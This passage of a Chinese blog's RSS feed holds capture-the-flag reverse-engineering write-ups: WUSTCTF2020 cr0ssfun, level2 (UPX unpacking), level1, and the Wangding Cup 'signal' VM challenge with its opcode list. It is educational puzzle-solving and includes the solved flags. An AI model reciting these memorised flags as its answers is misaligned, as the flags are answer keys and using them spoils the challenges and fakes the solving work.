	height=&#34;166&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527841-1177711980_hu971875531052002131.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180527841-1177711980_hu11013933970480447677.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;250&#34;
		data-flex-basis=&#34;600px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528172-502675895.png&#34;
	width=&#34;422&#34;
	height=&#34;163&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528172-502675895_hu5437780480069215867.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528172-502675895_hu5057328136559393518.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;258&#34;
		data-flex-basis=&#34;621px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528409-910783658.png&#34;
	width=&#34;422&#34;
	height=&#34;130&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528409-910783658_hu15385447622056854629.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528409-910783658_hu9472060210029131609.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;324&#34;
		data-flex-basis=&#34;779px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;每个函数的名字还挺有意思，三下五除二写个cpp：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528751-1897588300.png&#34;
	width=&#34;459&#34;
	height=&#34;482&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528751-1897588300_hu15683099440482596345.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180528751-1897588300_hu7601403424662909538.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;95&#34;
		data-flex-basis=&#34;228px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180529088-1429921510.png&#34;
	width=&#34;285&#34;
	height=&#34;32&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180529088-1429921510_hu13515659180420743113.png 480w, https://dorinxl.github.io/p/wustctf2020cr0ssfun/1858293-20200525180529088-1429921510_hu13941503570724509060.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;890&#34;
		data-flex-basis=&#34;2137px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;wctf2020{cpp_@nd_r3verse_@re_fun}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【WUSTCTF2020】level2</title>
        <link>https://dorinxl.github.io/p/wustctf2020level2/</link>
        <pubDate>Mon, 25 May 2020 09:48:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/wustctf2020level2/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174812751-1248040622.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174812751-1248040622_hu14637690474556606554.png 480w, https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174812751-1248040622_hu418083304141134611.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;一个UPX加壳题：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813279-1123232370.png&#34;
	width=&#34;518&#34;
	height=&#34;254&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813279-1123232370_hu12211169401393819795.png 480w, https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813279-1123232370_hu17945198773625568288.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;203&#34;
		data-flex-basis=&#34;489px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Elf直接upx -d脱壳：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813579-605555843.png&#34;
	width=&#34;508&#34;
	height=&#34;133&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813579-605555843_hu6458859075525930134.png 480w, https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813579-605555843_hu15019605450419782971.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;381&#34;
		data-flex-basis=&#34;916px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后扔进IDA，刚打开就看到flag了：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813842-351225748.png&#34;
	width=&#34;464&#34;
	height=&#34;69&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813842-351225748_hu16803618751042315697.png 480w, https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174813842-351225748_hu1858173819227584888.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;672&#34;
		data-flex-basis=&#34;1613px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;那我不脱壳直接用txt打开也能找到咯？&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174814155-590628313.png&#34;
	width=&#34;334&#34;
	height=&#34;86&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174814155-590628313_hu17828284081420824990.png 480w, https://dorinxl.github.io/p/wustctf2020level2/1858293-20200525174814155-590628313_hu10252942247872025791.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;388&#34;
		data-flex-basis=&#34;932px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;确实：wctf2020{Just_upx_-d}&lt;/p&gt;
&lt;p&gt;仅仅是upx -d&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【WUSTCTF2020】level1</title>
        <link>https://dorinxl.github.io/p/wustctf2020level1/</link>
        <pubDate>Mon, 25 May 2020 08:32:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/wustctf2020level1/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208033-35633309.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208033-35633309_hu5066087348581133016.png 480w, https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208033-35633309_hu5236916183561265898.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;切一道简单题，下载下来是elf和txt：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208321-981225454.png&#34;
	width=&#34;129&#34;
	height=&#34;58&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208321-981225454_hu14513024334727269533.png 480w, https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208321-981225454_hu15826666601995415354.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;222&#34;
		data-flex-basis=&#34;533px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;Ida打开看逻辑：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208565-1749470941.png&#34;
	width=&#34;476&#34;
	height=&#34;332&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208565-1749470941_hu5097140756845926023.png 480w, https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208565-1749470941_hu1197936906371698656.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;143&#34;
		data-flex-basis=&#34;344px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;按下标，奇数把输入左移下标数值位数，偶数下标把输入乘下标：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208936-1467183287.png&#34;
	width=&#34;760&#34;
	height=&#34;286&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208936-1467183287_hu4270298612643811592.png 480w, https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163208936-1467183287_hu807440446024839138.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;265&#34;
		data-flex-basis=&#34;637px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163209260-1791551158.png&#34;
	width=&#34;234&#34;
	height=&#34;30&#34;
	srcset=&#34;https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163209260-1791551158_hu2492180062150347575.png 480w, https://dorinxl.github.io/p/wustctf2020level1/1858293-20200525163209260-1791551158_hu9033797331407709658.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;780&#34;
		data-flex-basis=&#34;1872px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;ctf2020{d9-dE6-20c}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【网鼎杯青龙组】signal</title>
        <link>https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/</link>
        <pubDate>Sun, 24 May 2020 12:21:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/</guid>
        <description>&lt;p&gt;在参加网鼎杯之前，还没接触过vm指令的题，姑且是在网上找到好多，接下来几天慢慢做，看看能不能整理到一起。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039557-1020560755.png&#34;
	width=&#34;475&#34;
	height=&#34;174&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039557-1020560755_hu5183261499974333591.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039557-1020560755_hu7636432142967025870.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;272&#34;
		data-flex-basis=&#34;655px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;打开看着还挺简单的，一点进vm_operad人就傻了。&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039849-2103224361.jpg&#34;
	width=&#34;100&#34;
	height=&#34;100&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039849-2103224361_hu17056992445191051069.jpg 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202039849-2103224361_hu10503655810552573283.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;240px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;里面是各种操作，太长了就不截图了，我还没学会怎么在word文档里贴代码（对我都是word文档写好之后上传博客的）&lt;/p&gt;
&lt;p&gt;这里想说一下我对vm虚拟机这类题的理解。&lt;/p&gt;
&lt;p&gt;看起来好像是题目给出一串opcode，然后通关循环switch判断opcode的数，找到对应的操作。&lt;/p&gt;
&lt;p&gt;这群opcode里面可以既有代表某一操作的指令，也有需要操作的数据。&lt;/p&gt;
&lt;p&gt;我们需要做的就是找到操作的顺序和操作的数据，把他们逆着跑一边。&lt;/p&gt;
&lt;p&gt;这里我参考了网上的各种wp，可以手算，可以直接列出步骤机器算，也可以更加只能一点，重写逻辑顺序，我们一个一个来。&lt;/p&gt;
&lt;p&gt;第一步，我们要找到程序流程：&lt;/p&gt;
&lt;p&gt;用IDA扒下来opcode，但是里面夹杂着一堆零，我不知道怎么去除。于是我的第一步就是把这些零清除，然后输出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040144-749027204.png&#34;
	width=&#34;487&#34;
	height=&#34;274&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040144-749027204_hu9169929067678725293.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040144-749027204_hu1434459516102358944.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040568-1877262672.png&#34;
	width=&#34;960&#34;
	height=&#34;74&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040568-1877262672_hu6916972704815238983.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040568-1877262672_hu11746133054849233181.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1297&#34;
		data-flex-basis=&#34;3113px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;10, 4, 16, 8, 3, 5, 1, 4, 32, 8, 5, 3, 1, 3, 2, 8, 11, 1, 12, 8, 4, 4, 1, 5,
3, 8, 3, 33, 1, 11, 8, 11, 1, 4, 9, 8, 3, 32, 1, 2, 81, 8, 4, 36, 1, 12, 8,
11, 1, 5, 2, 8, 2, 37, 1, 2, 54, 8, 4, 65, 1, 2, 32, 8, 5, 1, 1, 5, 3, 8, 2,
37, 1, 4, 9, 8, 3, 32, 1, 2, 65, 8, 12, 1, 7, 34, 7, 63, 7, 52, 7, 50, 7, 114,
7, 51, 7, 24, 7, 167, 7, 49, 7, 241, 7, 40, 7, 132, 7, 193, 7, 30, 7, 122, 114&lt;/p&gt;
&lt;p&gt;先不用管他这些数都是干什么的，我们把操作流程扒下来就好。&lt;/p&gt;
&lt;p&gt;下面我们才需要看一下程序逻辑，找到几个关键的点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040868-866955714.png&#34;
	width=&#34;341&#34;
	height=&#34;154&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040868-866955714_hu16423499806708222119.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202040868-866955714_hu16870354272173750869.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;221&#34;
		data-flex-basis=&#34;531px&#34;
	
&gt;当操作码是1的时候，就是向v4数组存入数值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041245-558664964.png&#34;
	width=&#34;482&#34;
	height=&#34;383&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041245-558664964_hu6239483659903948019.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041245-558664964_hu11827977847688283729.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;125&#34;
		data-flex-basis=&#34;302px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041650-320995880.png&#34;
	width=&#34;276&#34;
	height=&#34;199&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041650-320995880_hu14500002310925725355.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041650-320995880_hu18264487740695761251.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;138&#34;
		data-flex-basis=&#34;332px&#34;
	
&gt;当操作码是2-5或者11-12的时候，就是对数据进行运算，然后保存。这里面的v5和v3都是临时存放数据用的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041881-1835011586.png&#34;
	width=&#34;406&#34;
	height=&#34;101&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041881-1835011586_hu2787242535365166400.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202041881-1835011586_hu3554237773110495959.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;401&#34;
		data-flex-basis=&#34;964px&#34;
	
&gt;当操作码是7的时候，其实是该对比处理过的flag了，源代码我给删了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042094-982018449.png&#34;
	width=&#34;180&#34;
	height=&#34;82&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042094-982018449_hu5729934514668735766.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042094-982018449_hu1744016997146007669.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;219&#34;
		data-flex-basis=&#34;526px&#34;
	
&gt;操作码6是跳到下一位。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042303-1853799268.png&#34;
	width=&#34;217&#34;
	height=&#34;122&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042303-1853799268_hu1505520419424610081.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042303-1853799268_hu12180130837392487159.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;177&#34;
		data-flex-basis=&#34;426px&#34;
	
&gt;操作码8是存储临时值，以便下次运算。&lt;/p&gt;
&lt;p&gt;这样一来，我把所有的操作过程的代码都删掉，只输出操作码，加上自己的标志，每次以1为结尾。因为1是存储flag然后接着处理下一个数了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042652-928016118.png&#34;
	width=&#34;960&#34;
	height=&#34;274&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042652-928016118_hu8797203888378368019.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202042652-928016118_hu11525443837931157422.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;350&#34;
		data-flex-basis=&#34;840px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这样一来我们也就知道，操作码7后面跟着的正是需要对比的数据，也是处理flag之后得到的数据。&lt;/p&gt;
&lt;p&gt;{0x22,0x3f,0x34,0x32,0x72,0x33,0x18,0xa7,0x31,0xf1,0x28,0x84,0xc1,0x1e,0x7a};&lt;/p&gt;
&lt;p&gt;第二步，逆向处理：&lt;br&gt;
先将操作码重写：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043028-418364895.png&#34;
	width=&#34;150&#34;
	height=&#34;302&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043028-418364895_hu6157909052938299001.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043028-418364895_hu11498880580837546108.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;49&#34;
		data-flex-basis=&#34;119px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后将每种操作码对应的操作逆向，以2-5为例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043447-71990255.png&#34;
	width=&#34;487&#34;
	height=&#34;394&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043447-71990255_hu16114635854934989183.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043447-71990255_hu2920283214682557196.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;296px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;需要注意的是，并不是完全的逆向流程，虽然我们将操作码的顺序反过来了，但是这里的步骤并不需要完全反过来求。&lt;/p&gt;
&lt;p&gt;不过这次是以v5和v4作为中介存储数据，v3存放flag：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043836-1587116052.png&#34;
	width=&#34;182&#34;
	height=&#34;144&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043836-1587116052_hu4438657325853745049.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202043836-1587116052_hu15916856026730604085.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这里要注意一点，char类型会溢出，所以我加了一点措施，将（char+256）再%256，防止溢出成负数运算。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202044603-1512829915.png&#34;
	width=&#34;1181&#34;
	height=&#34;645&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202044603-1512829915_hu15983650756021454686.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202044603-1512829915_hu6821563999728057840.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;183&#34;
		data-flex-basis=&#34;439px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;（这就去看看怎么粘代码）&lt;/p&gt;
&lt;p&gt;（算了还是太懒，有人想要的话私聊吧）&lt;/p&gt;
&lt;p&gt;总之是可以运算出结果了：&lt;br&gt;
&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045066-1794926562.png&#34;
	width=&#34;151&#34;
	height=&#34;38&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045066-1794926562_hu12135825764562545870.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045066-1794926562_hu5048303184066306260.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;397&#34;
		data-flex-basis=&#34;953px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;15是长度不要在意。&lt;/p&gt;
&lt;p&gt;还有一种做法，直接计算：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045484-527991319.png&#34;
	width=&#34;298&#34;
	height=&#34;310&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045484-527991319_hu15326449419957019611.png 480w, https://dorinxl.github.io/p/%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84signal/1858293-20200524202045484-527991319_hu8695920985586008551.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;96&#34;
		data-flex-basis=&#34;230px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这样来的十分之快，但是实用性不高，比赛的时候甚至可以手算，但是做题的话还是自动化吧。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【MRCTF2020】Transform</title>
        <link>https://dorinxl.github.io/p/mrctf2020transform/</link>
        <pubDate>Sun, 24 May 2020 08:33:00 +0000</pubDate>
        
